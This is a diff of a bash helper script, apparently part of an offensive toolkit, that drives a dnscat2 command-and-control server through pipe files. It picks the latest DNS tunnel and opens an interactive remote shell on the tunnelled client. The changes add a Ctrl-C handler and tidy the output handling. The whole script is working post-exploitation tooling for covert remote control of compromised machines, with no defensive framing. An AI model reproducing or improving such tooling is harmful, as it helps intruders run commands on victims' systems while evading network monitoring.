@@ -7,8 +7,8 @@ echo "/_/    \___/_/ /_/_____/_/ /_/|___/  ";
 echo "                                     ";
 echo ""
 echo "Author : lLou_"
-echo "Suite version : V0.1.5"
-echo "Script version : V0.1"
+echo "Suite version : V0.1.6"
+echo "Script version : V0.2"
 echo ""
 echo ""
 
@@ -18,14 +18,14 @@ usr=$(whoami)
 stdin="/home/$usr/session/dnscat.stdin"
 stdout="/home/$usr/session/dnscat.stdout"
 
-echo "" > $stdout
+echo -ne "" > $stdout
 echo "help" >> $stdin
 sleep 1
 if [[ ! "$(cat $stdout)" ]];then tput setaf 1;echo "[-] Did not find the correct pipe files... Exiting";tput sgr0;exit 1;fi
 
 echo "[+] Retrieving the last dns tunnel..."
 
-echo "" > $stdout
+echo -ne "" > $stdout
 echo "window" >> $stdin
 sleep 1
 target=$(cat $stdout | grep -a command | tail -n 1)
@@ -37,7 +37,7 @@ if [[ "$target" =~ "NOT verified" ]];then tput setaf 1;echo "[!] The tunnel is n
 
 target_id=$(echo $target | awk '{print($1)}')
 
-echo "" > $stdout
+echo -ne "" > $stdout
 echo "window -i $target_id" >> $stdin
 sleep 1
 if [[ $to_check ]];then tput setaf 3;checker=$(cat $stdout | grep -a ">>");echo "[?] Check that the client has the following $checker";to_check="1";tput sgr0;fi
@@ -45,7 +45,7 @@ if [[ $to_check ]];then tput setaf 3;checker=$(cat $stdout | grep -a ">>");echo 
 
 echo "[+] Generating shell..."
 
-echo "" > $stdout
+echo -ne "" > $stdout
 echo "shell" >> $stdin
 sleep 1
 shell_id=$(cat $stdout | grep -a "New window created" | awk '{print($NF)}')
@@ -56,26 +56,31 @@ sleep 1
 
 tput setaf 6;echo "[~] Launching shell...";tput sgr0
 
-echo "" > $stdout
+echo -ne "" > $stdout
 
 running="ok"
+closing () {
+   tput setaf 6;read -p "Do you want to close the shell (y/n) " close;tput sgr0
+   if [[ $close =~ "y" ]];then
+      tput setaf 6;echo "[~] Closing shell...";tput sgr0
+      running=""
+      echo "exit" >> $stdin
+   fi
+}
+
+trap closing INT
+
 while [[ "$running" ]];do
    read -p " > " command
    case $command in
       quit|exit|close|q|e|c)
-         tput setaf 6;read -p "Do you want to close the shell (y/n) " close;tput sgr0
-         if [[ $close =~ "y" ]];then
-            tput setaf 6;echo "[~] Closing shell...";tput sgr0
-            running=""
-            echo "exit" >> $stdin
-         fi
+         closing
          ;;
       *)
-         echo "" > $stdout
+         echo -ne "" > $stdout
          echo $command >> $stdin
-         sed -i "s/sh.*>//g" $stdout
-         while [[ ! $(cat $stdout) ]];do sleep 1;sed -i "s/sh.*>//g" $stdout; done
-         echo $(cat $stdout)
+         while [[ ! "$(sed "s/sh.*>//g" $stdout)" ]];do sleep 1; done
+         echo $(sed "s/sh.*>//g" $stdout)
          ;;
    esac
 done
